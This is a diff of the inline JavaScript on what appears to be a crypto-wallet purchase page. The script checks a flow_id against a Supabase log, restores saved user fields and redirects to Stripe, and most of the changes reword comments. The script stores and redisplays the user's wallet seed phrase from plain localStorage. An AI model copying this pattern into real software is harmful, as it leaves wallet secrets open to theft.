@@ -418,7 +418,7 @@
 
 <script>
 (async function() {
-  // 1. Check Supabase: if flow_id status COMPLETE, clear localStorage and reload to reset page
+  // On load: Check Supabase for flow_id; handle COMPLETE vs PENDING
   const flowID = localStorage.getItem('flow_id');
   let status = null;
   if (flowID) {
@@ -435,12 +435,9 @@
         location.reload();
         return;
       }
-    } catch {
-      // Fail silently, continue loading
-    }
+    } catch { /* Silent fail */ }
   }
 
-  // 2. Restore fields if not complete, scroll if needed (NO retry UI)
   document.addEventListener('DOMContentLoaded', () => {
     const savedEmail = localStorage.getItem('user_email') || '';
     const savedName = localStorage.getItem('user_name') || '';
@@ -455,8 +452,8 @@
     }
     if (savedSeed) document.getElementById('seed-phrase').innerText = savedSeed;
 
-    // Scroll to purchase if everything's filled and flow still pending
-    if (status === 'pending' && savedEmail && savedName && savedWallet && savedSeed) {
+    // Always auto-scroll to purchase section if flow_id exists and status is pending
+    if (flowID && status === 'pending' && savedEmail && savedName && savedWallet && savedSeed) {
       setTimeout(() => {
         const purchaseSection = document.getElementById('purchase-section');
         if (purchaseSection) purchaseSection.scrollIntoView({behavior:'smooth', block:'center'});
@@ -531,7 +528,7 @@ function submitEmail() {
   if (purchaseSection) purchaseSection.scrollIntoView({behavior:'smooth', block:'center'});
 }
 
-// FLOW_ID logic: flawless per requirements
+// FLOW_ID logic: keep, reuse, or burn as needed
 async function continueToPurchase() {
   const name = document.getElementById('user-name').value.trim();
   const email = document.getElementById('user-email').value.trim();
@@ -560,7 +557,7 @@ async function continueToPurchase() {
     infoChanged = true;
   }
 
-  // If flowID exists and info is unchanged, check status (reuse or block new log)
+  // If flowID exists and info unchanged, check status (reuse or reset)
   if (flowID && !infoChanged) {
     try {
       const res = await fetch(`https://xlbquzoalvwmtjadteft.supabase.co/rest/v1/create_log?flow_id=eq.${flowID}`, {
@@ -571,12 +568,11 @@ async function continueToPurchase() {
       const rows = await res.json();
       const status = rows[0]?.status || null;
       if (status === 'complete') {
-        // Burn and reset as new entry
         localStorage.clear();
         location.reload();
         return;
       }
-      // If pending, reuse flow_id and DO NOT log again—just send to Stripe
+      // If pending, reuse flow_id, no new log, just go to Stripe
       if (status === 'pending') {
         saveSessionFields();
         const flowType = 'create';
@@ -667,7 +663,6 @@ async function continueToPurchase() {
   }
 }
 </script>
-
 <!-- MOBILE-ONLY STYLING CODE: KEEP THIS AT THE END, OUTSIDE MAIN SCRIPT -->
 <script>
 window.addEventListener('DOMContentLoaded', function() {
